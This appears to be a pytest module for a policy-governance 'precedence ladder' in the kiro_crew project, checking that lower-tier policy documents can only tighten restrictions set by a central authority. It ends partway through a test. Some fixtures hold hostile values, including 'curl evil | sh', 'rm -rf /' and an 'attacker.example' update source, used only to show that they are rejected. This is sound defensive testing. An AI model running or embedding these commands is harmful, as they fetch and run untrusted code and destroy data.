"""The precedence ladder, and the tighten-only composition rule beneath it.

Covers the composition primitive every tier below the authority goes through:

* ``_intersect_ceilings``: a subordinate may add restrictions and may not remove
  one, and everything outside ``controls`` stays the authority's;
* that there is NO channel by which a lower tier outranks the authority -- in
  particular ``KIROCREW_SECURITY_POLICY``, which a runbook may still describe as a
  rollback lever;
* the one-time signals the ladder emits (the env-tightens-only warning, the
  per-pair intersect audit) and the process state that latches them;
* that a live central refresh folds the WHOLE ladder, so a local restriction
  survives a poll.

**Nothing here touches the network or a real policy path.** The autouse fixture
points ``_policy_home_path`` at a nonexistent file under ``tmp_path`` and deletes
every tier-selecting environment variable, and the ``central`` fixture publishes
the authority through the module's fake-transport seam.
"""

from __future__ import annotations

import json
from pathlib import Path

import pytest

from kiro_crew.platform import governance
from kiro_crew.platform import governance_health as health
from kiro_crew.platform import governance_profiles as gp
from kiro_crew.platform import policy_distribution as pd
from kiro_crew.platform.governance import (
    SIGNATURE_UNSIGNED,
    SIGNATURE_UNVERIFIED,
    TIER_CENTRAL,
    TIER_ENV,
    TIER_HOME,
    load_security_policy,
    resolve,
    resolve_ordinal,
)

_POLICY_ENV = "KIROCREW_SECURITY_POLICY"

#: A scheme no built-in transport handles, so the fake fetcher the ``central``
#: fixture registers cannot be confused with (or shadowed by) https/http/file.
_TEST_SCHEME = "kctest"
_TEST_SOURCE = f"{_TEST_SCHEME}://policy.example/security_policy.json"


# ──────────────────────────────────────────────────────────────────────────
# Helpers -- same document-building idiom as test_governance_policy.py /
# test_governance_distribution.py: a minimal valid body, tagged by
# ``identity.issuer`` so a precedence assertion can name the document that won
# without parsing a control out of it.
# ──────────────────────────────────────────────────────────────────────────


def _doc(marker: str = "", **extra: object) -> dict:
    body: dict = {"version": 1, "boot": {"fail_closed": True}}
    if marker:
        body["identity"] = {"issuer": marker}
    body.update(extra)
    return body


def _write_policy(path: Path, marker: str = "", **extra: object) -> Path:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(_doc(marker, **extra)), encoding="utf-8")
    return path


def _point_home(monkeypatch, path: Path) -> None:
    monkeypatch.setattr(governance, "_policy_home_path", lambda: path)


def _recording_sel():
    """A SEL stub that keeps every ``log_api_access`` call the ladder makes."""

    class Stub:
        def __init__(self):
            self.calls = []

        def log_api_access(self, **kw):
            self.calls.append(kw)

    return Stub()


def _rows(stub, operation: str) -> list:
    return [c["resources"] for c in stub.calls if c.get("operation") == operation]


# ──────────────────────────────────────────────────────────────────────────
# Fixtures
# ──────────────────────────────────────────────────────────────────────────


@pytest.fixture(autouse=True)
def _hermetic_governance_globals(monkeypatch, tmp_path):
    """Pin every process global and env var this module's subject reads.

    The home seam is aimed at a nonexistent file under ``tmp_path`` so a
    developer's own ``security_policy.json`` can never be the document an
    assertion here reads. The env vars are deleted because each selects a tier:
    one left set by a CI image would make every precedence assertion read a file
    this module never wrote. ``governance_health`` and ``governance_profiles``
    keep worker-lifetime state, so both are reset on the way in and on the way
    out, and the fetch window is reopened at SETUP so no test here depends on the
    previous one having torn itself down.
    """
    # Every per-process latch and memo the ladder keeps (the env-inversion warning,
    # the intersect pairs, the last bundled document, the last fold) lives in one
    # holder and is reset together, so a fixture cannot forget one -- that is how
    # ``last_bundled`` leaked between tests when it was a separate global.
    governance.reset_process_state()
    for var in (
        _POLICY_ENV,
        "KIROCREW_ADMISSION_POLICY",
        "KIROCREW_POLICY_URL",
        "KIROCREW_POLICY_HEADERS",
        "KIROCREW_POLICY_CACHE_ONLY",
    ):
        monkeypatch.delenv(var, raising=False)
    _point_home(monkeypatch, tmp_path / "absent" / "home.json")
    pd.reset_fetch_window()
    health.reset()
    gp.reset_store()
    yield
    governance.reset_process_state()
    health.reset()
    gp.reset_store()


@pytest.fixture
def central(monkeypatch):
    """Publish a document as the CENTRAL tier -- the ladder's authority.

    Yields ``publish(marker, **extra)``. The transport is a fake fetcher rather
    than a real ``file://`` source because this module's subject is composition,
    not the transport: a real file source additionally has to satisfy the
    not-agent-writable precondition, which ``tmp_path`` cannot (``/tmp`` is
    world-writable), so every test here would refuse for a reason it is not
    testing.

    ``_FETCHERS`` is a module global shared by every test on this worker, so the
    snapshot/restore is not tidiness -- a leaked scheme would silently answer some
    later test's fetch. Assigned directly rather than through
    ``register_policy_fetcher`` because that seam raises on a re-registration by
    design, and a test may publish more than once.
    """
    snapshot = dict(pd._FETCHERS)
    try:

        def publish(marker: str = "fleet", **extra: object) -> str:
            body = json.dumps(_doc(marker, **extra)).encode("utf-8")

            def fetch(request: pd.FetchRequest) -> pd.FetchedPolicy:
                return pd.FetchedPolicy(body=body)

            with pd._FETCHER_LOCK:
                pd._FETCHERS[_TEST_SCHEME] = fetch
            monkeypatch.setenv("KIROCREW_POLICY_URL", _TEST_SOURCE)
            return _TEST_SOURCE

        yield publish
    finally:
        with pd._FETCHER_LOCK:
            pd._FETCHERS.clear()
            pd._FETCHERS.update(snapshot)


# ──────────────────────────────────────────────────────────────────────────
# A subordinate may only tighten
# ──────────────────────────────────────────────────────────────────────────
class TestASubordinateMayOnlyTighten:
    def _compose(self, monkeypatch, tmp_path, central, authority: dict, subordinate: dict):
        """Load with a central *authority* and a home *subordinate*."""
        central("fleet", **authority)
        home = tmp_path / "home.json"
        home.write_text(json.dumps({**_doc("operator"), **subordinate}), encoding="utf-8")
        _point_home(monkeypatch, home)
        ceiling = load_security_policy()
        assert ceiling is not None
        return ceiling

    def test_a_subordinate_addition_to_a_governed_scope_is_applied(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"commands": {"mode": "deny", "deny": ["git push*"]}},
            subordinate={"commands": {"mode": "deny", "deny": ["rm -rf*"]}},
        )
        # deny∪ -- both denials bind.
        assert not resolve(ceiling, None, "commands", "git push origin").permitted
        assert not resolve(ceiling, None, "commands", "rm -rf /").permitted
        assert resolve(ceiling, None, "commands", "ls -la").permitted

    def test_a_subordinate_cannot_widen_a_deny_list_by_omission(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"commands": {"mode": "deny", "deny": ["git push*"]}},
            subordinate={"commands": {"mode": "deny", "deny": []}},
        )
        assert not resolve(ceiling, None, "commands", "git push origin").permitted

    def test_a_subordinate_cannot_widen_an_allowlist(self, monkeypatch, tmp_path, central):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"tools": {"mode": "allow", "allow": ["read", "grep"]}},
            subordinate={"tools": {"mode": "allow", "allow": ["read", "grep", "execute_bash"]}},
        )
        # allow∩ -- the extra entry the subordinate added does not appear.
        assert resolve(ceiling, None, "tools", "read").permitted
        assert not resolve(ceiling, None, "tools", "execute_bash").permitted

    def test_a_subordinate_allowlist_narrows_when_it_is_smaller(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"tools": {"mode": "allow", "allow": ["read", "grep"]}},
            subordinate={"tools": {"mode": "allow", "allow": ["read"]}},
        )
        assert resolve(ceiling, None, "tools", "read").permitted
        assert not resolve(ceiling, None, "tools", "grep").permitted

    def test_a_subordinate_cannot_flip_a_deny_scope_open_with_allow_mode(
        self, monkeypatch, tmp_path, central
    ):
        # Rule 1 makes allow-mode ignore deny entirely WITHIN one ruleset, so a
        # subordinate switching mode is the obvious widening attempt. Composition
        # is an AND of the two rulesets, not a mode handover, so it fails.
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"commands": {"mode": "deny", "deny": ["git push*"]}},
            subordinate={"commands": {"mode": "allow", "allow": ["git push*", "ls*"]}},
        )
        assert not resolve(ceiling, None, "commands", "git push origin").permitted

    def test_a_subordinate_cannot_relax_an_ordinal(self, monkeypatch, tmp_path, central):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"sandbox": {"min_level": "strict"}},
            subordinate={"sandbox": {"min_level": "off"}},
        )
        control = resolve_ordinal(ceiling, None, "sandbox.min_level")
        assert control is not None
        assert control.value == "strict"

    def test_a_subordinate_may_tighten_an_ordinal(self, monkeypatch, tmp_path, central):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"sandbox": {"min_level": "standard"}},
            subordinate={"sandbox": {"min_level": "strict"}},
        )
        control = resolve_ordinal(ceiling, None, "sandbox.min_level")
        assert control is not None
        assert control.value == "strict"

    def test_a_subordinate_cannot_relax_an_approval_ordinal(self, monkeypatch, tmp_path, central):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"approval_mode": "interactive"},
            subordinate={"approval_mode": "yolo"},
        )
        control = resolve_ordinal(ceiling, None, "approval_mode")
        assert control is not None
        assert control.value == "interactive"

    def test_a_subordinate_cannot_re_enable_a_disabled_capability(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"capabilities": {"script_hooks": {"enabled": False}}},
            subordinate={"capabilities": {"script_hooks": {"enabled": True}}},
        )
        gate = ceiling.get("capabilities.script_hooks")
        assert gate is not None
        assert gate.enabled is False  # type: ignore[attr-defined]

    def test_a_subordinate_may_disable_a_capability_the_authority_enabled(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"capabilities": {"script_hooks": {"enabled": True}}},
            subordinate={"capabilities": {"script_hooks": {"enabled": False}}},
        )
        gate = ceiling.get("capabilities.script_hooks")
        assert gate is not None
        assert gate.enabled is False  # type: ignore[attr-defined]

    def test_a_scope_only_the_subordinate_governs_carries_through(
        self, monkeypatch, tmp_path, central
    ):
        # An ungoverned scope is unrestricted, so ADDING governance to it is a
        # tightening, not an escape -- the subordinate's control survives whole.
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"commands": {"mode": "deny", "deny": ["git push*"]}},
            subordinate={"tools": {"mode": "allow", "allow": ["read"]}},
        )
        assert resolve(ceiling, None, "tools", "read").permitted
        assert not resolve(ceiling, None, "tools", "execute_bash").permitted
        assert not resolve(ceiling, None, "commands", "git push origin").permitted

    def test_a_scope_only_the_authority_governs_is_not_repealed_by_omission(
        self, monkeypatch, tmp_path, central
    ):
        ceiling = self._compose(
            monkeypatch,
            tmp_path,
            central,
            authority={"tools": {"mode": "allow", "allow": ["read"]}},
            subordinate={"commands": {"mode": "deny", "deny": ["rm -rf*"]}},
        )
        assert not resolve(ceiling, None, "tools", "execute_bash").permitted

    def test_composition_is_the_same_for_the_env_tier(self, monkeypatch, tmp_path, central):
        # The subordinate's identity does not change the algebra: whichever of
        # tiers 2-4 is present composes the same way.
        central("fleet", tools={"mode": "allow", "allow": ["read"]})
        monkeypatch.setenv(
            _POLICY_ENV,
            str(
                _write_policy(
                    tmp_path / "env.json",
                    "local-env",
                    tools={"mode": "allow", "allow": ["read", "execute_bash"]},
                )
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert resolve(ceiling, None, "tools", "read").permitted
        assert not resolve(ceiling, None, "tools", "execute_bash").permitted


class TestAnEnvDocumentBeneathAnAuthorityIsAnnouncedOnce:
    """The precedence inversion is otherwise silent at the moment it bites.

    Before this change ``KIROCREW_SECURITY_POLICY`` outranked the central document and
    was the documented mid-incident rollback lever. Now it only tightens. A fleet whose
    runbook still says "set the env var to roll back" learns that mid-incident unless
    the host says so -- so the FIRST time the inverted shape composes, it warns once
    (log + SEL row), and then stays quiet: the shape is stable for the process lifetime.
    """

    def test_env_beneath_central_warns_once_and_audits(
        self, monkeypatch, tmp_path, central, caplog
    ):
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        central("fleet")
        monkeypatch.setenv(_POLICY_ENV, str(_write_policy(tmp_path / "env.json", "local-env")))

        with caplog.at_level("WARNING", logger="kiro_crew.platform.governance"):
            load_security_policy()
            load_security_policy()

        rows = _rows(stub, "security_policy_env_tightens_only")
        assert len(rows) == 1, "once per process, not once per compose"
        assert rows[0] == f"{TIER_CENTRAL}<-{TIER_ENV}"
        warned = [r for r in caplog.records if "can only tighten" in r.getMessage()]
        assert len(warned) == 1

    def test_env_alone_does_not_warn(self, monkeypatch, tmp_path):
        """A standalone host with only an env document is the old shape; nothing inverted."""
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        monkeypatch.setenv(_POLICY_ENV, str(_write_policy(tmp_path / "env.json", "local-env")))

        load_security_policy()

        assert _rows(stub, "security_policy_env_tightens_only") == []

    def test_a_home_document_beneath_central_does_not_warn(self, monkeypatch, tmp_path, central):
        """Home never outranked anything, so there is no inversion to announce."""
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        central("fleet")
        _point_home(monkeypatch, _write_policy(tmp_path / "home.json", "operator"))

        load_security_policy()

        assert _rows(stub, "security_policy_env_tightens_only") == []


class TestReservedSandboxFlagsComposeAcrossTiers:
    """``sandbox.require_isolation`` / ``env_scrub_prefixes`` are documented
    reserved boot flags that ``_parse_controls`` stores as a plain ``dict`` under
    ``sandbox._flags``.  Before the ladder existed only one ceiling ever held them;
    two tiers each declaring one is an ordinary fleet configuration and must not
    abort boot as a "mismatched control type"."""

    def _ceiling(self, **sandbox):
        return governance.parse_policy(
            {"version": 1, "boot": {"fail_closed": True}, "sandbox": sandbox}
        )

    def test_two_tiers_each_carrying_a_reserved_flag_compose_instead_of_crashing(self):
        authority = self._ceiling(require_isolation=True)
        subordinate = self._ceiling(env_scrub_prefixes=["AWS_"])
        merged = governance._intersect_ceilings(authority, subordinate)
        assert merged.controls["sandbox._flags"] == {
            "require_isolation": True,
            "env_scrub_prefixes": ["AWS_"],
        }

    def test_the_authority_wins_a_flag_both_tiers_set(self):
        authority = self._ceiling(require_isolation=True)
        subordinate = self._ceiling(require_isolation=False)
        merged = governance._intersect_ceilings(authority, subordinate)
        assert merged.controls["sandbox._flags"] == {"require_isolation": True}

    def test_through_the_loader_with_a_central_and_a_home_document(
        self, monkeypatch, tmp_path, central
    ):
        central("fleet", sandbox={"require_isolation": True})
        home = tmp_path / "home.json"
        home.write_text(
            json.dumps({**_doc("operator"), "sandbox": {"env_scrub_prefixes": ["AWS_"]}}),
            encoding="utf-8",
        )
        _point_home(monkeypatch, home)
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.controls["sandbox._flags"]["require_isolation"] is True


class TestEveryCeilingFieldHasAComposeClass:
    """Every ``GovernanceCeiling`` field is placed in exactly one precedence class.

    ``_intersect_ceilings`` documents two classes for the fields outside ``controls``
    -- "absence means no choice" (a lower tier may supply it) and "absence means the
    fail-closed floor" (authority-only) -- and gets the second for free from
    ``replace(authority, ...)``. That default is exactly how a misclassification ships
    silently: a new field inherits authority-only whether or not that is right, and
    ``fallback_profile`` has already been through that once. This test makes the next
    field a deliberate decision: add it to one of the sets below, or fail here.
    """

    #: Folded field-by-field by ``_intersect_ceilings`` (tighten-only). ``updates``
    #: folds its two restriction pins and keeps the commands the authority's; see
    #: ``TestUpdatePinsFoldAsRestrictions``.
    COMPOSED = frozenset({"boot", "controls", "updates"})
    #: "Absence means no choice expressed": the highest tier that declared one wins,
    #: re-applied by ``compose_tier_ladder``.
    LOWER_MAY_SUPPLY = frozenset({"distribution"})
    #: "Absence means the fail-closed floor": always the authority's own value.
    AUTHORITY_ONLY = frozenset(
        {
            "version",
            "identity_issuer",
            "identity_signature",
            "signature_state",
            "fallback_profile",
            "agentcore_identity_posture",
            "agentcore_gateway_url",
            "agentcore_workload_name",
            "tier",
        }
    )

    def test_every_field_is_classified_exactly_once(self):
        from dataclasses import fields

        declared = {f.name for f in fields(governance.GovernanceCeiling)}
        classified = self.COMPOSED | self.LOWER_MAY_SUPPLY | self.AUTHORITY_ONLY
        assert not (self.COMPOSED & self.LOWER_MAY_SUPPLY & self.AUTHORITY_ONLY)
        assert declared - classified == set(), (
            "new GovernanceCeiling field(s) with no compose class -- decide whether a "
            "lower tier may supply each one and add it to the matching set above"
        )
        assert classified - declared == set(), "classified field(s) no longer exist"

    def test_authority_only_fields_keep_the_authority_value(self):
        """The classification is checked against the fold, not just against itself."""
        from dataclasses import replace

        authority = governance.parse_policy(_doc("authority"))
        subordinate = replace(
            governance.parse_policy(_doc("subordinate")),
            identity_signature="sub-sig",
            signature_state=SIGNATURE_UNVERIFIED,
            tier=TIER_HOME,
            agentcore_gateway_url="https://sub.example",
            agentcore_workload_name="sub-workload",
            agentcore_identity_posture="login",
        )

        merged = governance._intersect_ceilings(authority, subordinate)

        for name in self.AUTHORITY_ONLY:
            assert getattr(merged, name) == getattr(authority, name), name


class TestATierIntersectIsAuditedOncePerPairNotPerCompose:
    """``compose_tier_ladder`` runs per app callback, and the pairs it folds are fixed.

    An earlier revision wrote a ``security_policy_tier_intersect`` row on EVERY compose,
    so the flagship shape (central + home present) appended one unchanging row to the
    append-only SEL per interaction, burying the env-inversion signal a fleet actually
    reads. The record is now keyed on the ``(authority, lower)`` pair: the first compose
    of a pair writes one row, a repeat writes nothing, and a tier that appears later (an
    env document set after boot) is still recorded once.
    """

    def test_repeated_composes_of_the_same_shape_write_one_row(
        self, monkeypatch, tmp_path, central
    ):
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        central("fleet")
        _point_home(monkeypatch, _write_policy(tmp_path / "home.json", "operator"))

        for _ in range(5):
            load_security_policy()

        assert _rows(stub, "security_policy_tier_intersect") == [f"{TIER_CENTRAL}<-{TIER_HOME}"]

    def test_a_tier_that_appears_later_is_still_recorded_once(self, monkeypatch, tmp_path, central):
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        central("fleet")
        _point_home(monkeypatch, _write_policy(tmp_path / "home.json", "operator"))

        load_security_policy()
        monkeypatch.setenv(_POLICY_ENV, str(_write_policy(tmp_path / "env.json", "local-env")))
        load_security_policy()
        load_security_policy()

        rows = _rows(stub, "security_policy_tier_intersect")
        assert rows.count(f"{TIER_CENTRAL}<-{TIER_HOME}") == 1
        assert rows.count(f"{TIER_CENTRAL}<-{TIER_ENV}") == 1
        assert len(rows) == 2


class TestARefreshTagsTheCentralDocumentLikeBootDoes:
    """``compose_installed_ceiling`` must compose an untiered fetched document as CENTRAL.

    ``parse_distributed_policy`` returns a ceiling with no tier; boot tags it
    ``TIER_CENTRAL`` before folding. A refresh that passed it in untagged made
    ``compose_tier_ladder``'s ``ceiling.tier == TIER_CENTRAL`` guard False, so a host
    that reached the fleet document only on a later poll never got the
    env-tightens-only warning -- the exact host the warning targets -- and its intersect
    row read ``""<-env``.
    """

    def test_an_untagged_central_document_composes_as_the_central_tier(self, monkeypatch, tmp_path):
        stub = _recording_sel()
        monkeypatch.setattr(governance, "sel", lambda: stub)
        monkeypatch.setenv(_POLICY_ENV, str(_write_policy(tmp_path / "env.json", "local-env")))
        untagged = governance.parse_policy(_doc("fleet"))
        assert untagged.tier == ""

        composed = governance.compose_installed_ceiling(untagged)

        assert composed is not None
        assert composed.tier == TIER_CENTRAL
        rows = [c["resources"] for c in stub.calls]
        assert f"{TIER_CENTRAL}<-{TIER_ENV}" in rows
        assert any(c.get("operation") == "security_policy_env_tightens_only" for c in stub.calls)
        assert not any(r.startswith("<-") for r in rows), rows

    def test_an_already_tagged_document_alone_is_returned_by_identity(self):
        # The standalone-host promise: the fetched document IS the installed one.
        from dataclasses import replace

        central = replace(governance.parse_policy(_doc("fleet")), tier=TIER_CENTRAL)
        assert governance.compose_installed_ceiling(central) is central


class TestTheLadderProcessStateResetsAsOneUnit:
    """Every per-process value the ladder keeps lives in one holder.

    Separate module globals were reset by hand in two test fixtures, and the leak of
    the last bundled document was the fixture that reset all but one of them. One
    dataclass, one ``reset_process_state()``.
    """

    def test_reset_clears_every_field(self, monkeypatch, tmp_path, central):
        central("fleet")
        _point_home(monkeypatch, _write_policy(tmp_path / "home.json", "operator"))
        monkeypatch.setenv(_POLICY_ENV, str(_write_policy(tmp_path / "env.json", "local-env")))
        load_security_policy(bundled_loader=lambda: _doc("b"))
        st = governance._process_state
        assert st.last_bundled is not None
        assert st.env_beneath_central_warned is True
        assert st.tier_intersects_audited
        assert st.last_composed is not None

        governance.reset_process_state()

        st = governance._process_state
        assert st == governance._TierProcessState()


class TestBootFlagsComposeStrictestWins:
    def _boot(self, monkeypatch, tmp_path, central, authority: dict, subordinate: dict):
        central("fleet", boot=authority)
        home = tmp_path / "home.json"
        home.write_text(
            json.dumps({"version": 1, "boot": subordinate, "identity": {"issuer": "operator"}}),
            encoding="utf-8",
        )
        _point_home(monkeypatch, home)
        ceiling = load_security_policy()
        assert ceiling is not None
        return ceiling.boot

    def test_a_strict_subordinate_tightens_a_loose_authority(self, monkeypatch, tmp_path, central):
        boot = self._boot(
            monkeypatch,
            tmp_path,
            central,
            authority={"require_sandbox": False, "allow_terminal": True, "fail_closed": False},
            subordinate={"require_sandbox": True, "allow_terminal": False, "fail_closed": True},
        )
        assert boot.require_sandbox is True  # OR
        assert boot.allow_terminal is False  # AND
        assert boot.fail_closed is True  # OR

    def test_a_loose_subordinate_cannot_relax_a_strict_authority(
        self, monkeypatch, tmp_path, central
    ):
        boot = self._boot(
            monkeypatch,
            tmp_path,
            central,
            authority={"require_sandbox": True, "allow_terminal": False, "fail_closed": True},
            subordinate={"require_sandbox": False, "allow_terminal": True, "fail_closed": False},
        )
        assert boot.require_sandbox is True
        assert boot.allow_terminal is False
        assert boot.fail_closed is True

    def test_allow_terminal_needs_both_tiers_to_agree(self, monkeypatch, tmp_path, central):
        boot = self._boot(
            monkeypatch,
            tmp_path,
            central,
            authority={"allow_terminal": True},
            subordinate={"allow_terminal": True},
        )
        assert boot.allow_terminal is True


# ──────────────────────────────────────────────────────────────────────────
# Everything outside ``controls`` stays the authority's
# ──────────────────────────────────────────────────────────────────────────
class TestNonControlFieldsStayWithTheAuthority:
    @pytest.fixture
    def composed(self, monkeypatch, tmp_path, central):
        central(
            "fleet",
            updates={"source": "git@fleet.example:kirocrew.git", "min_version": "9.9.9"},
        )
        home = tmp_path / "home.json"
        home.write_text(
            json.dumps(
                {
                    "version": 1,
                    "boot": {"fail_closed": True},
                    # A signed-but-unprovable identity, so the composed
                    # signature_state can be told apart from the authority's.
                    "identity": {"issuer": "operator", "signature": "deadbeef"},
                    "updates": {"source": "git@attacker.example:x.git", "min_version": "0.0.1"},
                }
            ),
            encoding="utf-8",
        )
        _point_home(monkeypatch, home)
        ceiling = load_security_policy()
        assert ceiling is not None
        return ceiling

    def test_identity_stays_the_authoritys(self, composed):
        assert composed.identity_issuer == "fleet"
        assert composed.identity_signature == ""

    def test_signature_state_stays_the_authoritys(self, composed):
        # The central document carries no signature; the home one carries an
        # unprovable one. A subordinate must not relabel the ceiling's provenance
        # in either direction.
        assert composed.signature_state == SIGNATURE_UNSIGNED
        assert composed.signature_state != SIGNATURE_UNVERIFIED

    def test_update_pins_cannot_be_loosened_by_the_subordinate(self, composed):
        # The authority pinned both; the home document names another source and a
        # lower floor. Neither replaces the authority's: a subordinate may narrow an
        # update pin (``TestUpdatePinsFoldAsRestrictions``), never widen one.
        assert composed.updates.source == "git@fleet.example:kirocrew.git"
        assert composed.updates.min_version == "9.9.9"

    def test_distribution_pins_stay_the_authoritys(self, composed):
        # Neither DOCUMENT declares a source (the address comes from the environment
        # here), so the assertion is that the composed value is the authority's -- a
        # subordinate cannot redirect where the NEXT document comes from.
        assert composed.distribution == governance.PolicyDistribution()

    def test_the_tier_label_stays_the_authoritys(self, composed):
        assert composed.tier == TIER_CENTRAL

    def test_a_subordinate_fallback_is_ignored_when_the_authority_declares_none(
        self, monkeypatch, tmp_path, central
    ):
        # An authority that declared no fallback means an unusable profile file
        # DENIES its surface (fail-closed). A subordinate supplying one would replace
        # that floor with something looser -- the escape hatch widened by the tier
        # that may only tighten. A subordinate that wants a fallback asks the fleet to
        # declare one.
        central("fleet")
        _point_home(
            monkeypatch,
            _write_policy(
                tmp_path / "home.json",
                "operator",
                fallback={"tools": {"mode": "allow", "allow": ["read"]}},
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.tier == TIER_CENTRAL
        assert ceiling.fallback_profile is None

    def test_the_authoritys_fallback_wins_when_both_declare_one(
        self, monkeypatch, tmp_path, central
    ):
        central("fleet", fallback={"tools": {"mode": "allow", "allow": ["grep"]}})
        _point_home(
            monkeypatch,
            _write_policy(
                tmp_path / "home.json",
                "operator",
                fallback={"tools": {"mode": "allow", "allow": ["read"]}},
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        fallback = ceiling.fallback_profile
        assert fallback is not None
        assert resolve(None, fallback, "tools", "grep").permitted
        assert not resolve(None, fallback, "tools", "read").permitted


class TestUpdatePinsFoldAsRestrictions:
    """``updates.source`` and ``updates.min_version`` are restrictions, so a subordinate
    that sets one the authority left empty tightens the ceiling and must keep it.

    Dropping them with the rest of the out-of-``controls`` fields would void a pure
    tightening: an empty source pin permits ANY remote (``permits_source``), so a
    central document that says nothing about updates plus a local operator who pinned
    the source would compose to "install from anywhere" -- code from a source the
    operator forbade. The update *commands* stay authority-only: a command runs
    unsandboxed as the gateway, so a lower tier supplying one is an escalation.
    """

    def test_a_subordinate_source_pin_survives_an_authority_that_declares_none(
        self, monkeypatch, tmp_path, central
    ):
        central("fleet")
        _point_home(
            monkeypatch,
            _write_policy(
                tmp_path / "home.json",
                "operator",
                updates={"source": "git@fleet.example:kirocrew.git"},
            ),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.tier == TIER_CENTRAL
        assert ceiling.updates.source == "git@fleet.example:kirocrew.git"
        assert not ceiling.updates.permits_source("git@attacker.example:x.git")
        assert ceiling.updates.permits_source("git@fleet.example:kirocrew.git")

    def test_a_subordinate_min_version_survives_an_authority_that_declares_none(
        self, monkeypatch, tmp_path, central
    ):
        central("fleet")
        _point_home(
            monkeypatch,
            _write_policy(tmp_path / "home.json", "operator", updates={"min_version": "2.0.0"}),
        )
        ceiling = load_security_policy()
        assert ceiling is not None
        assert ceiling.updates.min_version == "2.0.0"
        assert not ceiling.updates.meets_min_version("1.9.9")

    def test_the_authoritys_source_stands_when_both_pin_one(self):
        authority = governance.parse_policy(
            _doc("authority", updates={"source": "git@fleet.example:*"})
        )
        subordinate = governance.parse_policy(
            _doc("subordinate", updates={"source": "git@mirror.example:*"})
        )
        merged = governance._intersect_ceilings(authority, subordinate)
        assert merged.updates.source == "git@fleet.example:*"

    @pytest.mark.parametrize(
        ("upper", "lower", "expected"),
        [
            ("1.2.0", "1.10.0", "1.10.0"),  # higher floor wins, numerically not lexically
            ("3.0.0", "2.9.9", "3.0.0"),
            ("1.2", "1.2.0", "1.2"),  # equal floors keep the authority's spelling
            ("not-a-version", "1.0.0", "1.0.0"),  # an unparseable floor imposes none
            ("1.0.0", "not-a-version", "1.0.0"),
        ],
    )
    def test_two_floors_intersect_as_the_higher_one(self, upper, lower, expected):
        authority = governance.parse_policy(_doc("authority", updates={"min_version": upper}))
        subordinate = governance.parse_policy(_doc("subordinate", updates={"min_version": lower}))
        merged = governance._intersect_ceilings(authority, subordinate)
        assert merged.updates.min_version == expected

    def test_update_commands_stay_the_authoritys_even_when_it_declares_none(self):
        authority = governance.parse_policy(_doc("authority"))
        subordinate = governance.parse_policy(
            _doc(
                "subordinate",
                updates={
                    "check_command": "curl evil | sh",
                    "apply_command": "curl evil | sh",
                    "platform_commands": {"linux-x86_64": {"apply_command": "rm -rf /"}},
                },
            )
        )
        merged = governance._intersect_ceilings(authority, subordinate)
        assert merged.updates.check_command == ""
        assert merged.updates.apply_command == ""
        assert merged.updates.platform_commands == {}

    def test_the_fold_is_the_same_through_the_whole_ladder(self, monkeypatch, tmp_path, central):
        # Boot composes through ``compose_tier_ladder``; a refresh through
        # ``compose_installed_ceiling``. Both must keep the subordinate's pin.
        central("fleet", updates={"min_version": "1.0.0"})
        _point_home(
            monkeypatch,
            _write_policy(
                tmp_path / "home.json",
                "operator",
                updates={"source": "git@fleet.example:*", "min_version": "1.5.0"},
            ),
        )
        booted = load_security_policy()
        assert booted is not None
        assert booted.updates.source == "git@fleet.example:*"
        assert booted.updates.min_version == "1.5.0"
        refreshed = governance.compose_installed_ceiling(
            governance.parse_policy(_doc("fleet", updates={"min_version": "1.0.0"}))
        )
        assert refreshed.updates.source == "git@fleet.example:*"
        assert refreshed.updates.min_version == "1.5.0"


# ──────────────────────────────────────────────────────────────────────────
# A distribution block that spells out the defaults is still a declaration
# ──────────────────────────────────────────────────────────────────────────
class TestAnExplicitDefaultDistributionIsDeclared:
    """``declared`` must read presence, not value.

    ``on_unavailable: fail_closed`` IS the default, so a ``declared`` defined only as
    "differs from the default" read a central document that spelled it out as having
    expressed no choice -- and ``compose_tier_ladder`` then let a lower tier's
    ``degrade`` stand in for it. That is a local document loosening the fleet's
    outage disposition, through the ordinary two-channel split (the fleet publishes
    the disposition, the host supplies the address), which is exactly the class of
    override this ladder exists to refuse.
    """

    @pytest.fixture(autouse=True)
    def _address_from_the_environment(self, monkeypatch):
        # A source-less block is only accepted when the environment names the
        # address -- the two-channel split these tests are about.
        monkeypatch.setenv("KIROCREW_POLICY_URL", _TEST_SOURCE)

    def test_a_present_block_spelling_the_default_is_declared(self):
        block = governance.PolicyDistribution.from_dict(
            {"on_unavailable": governance.UNAVAILABLE_FAIL_CLOSED}
        )
        assert block.declared is True

    def test_an_absent_block_is_not_declared(self):
        assert governance.PolicyDistribution.from_dict({}).declared is False
        assert governance.PolicyDistribution().declared is False

    def test_presence_does_not_disturb_equality(self):
        # ``explicit`` is outside ``__eq__`` on purpose: callers compare a composed
        # distribution against the authority's to decide whether the fold moved it,
        # and a block that spells out the defaults must still read as the defaults.
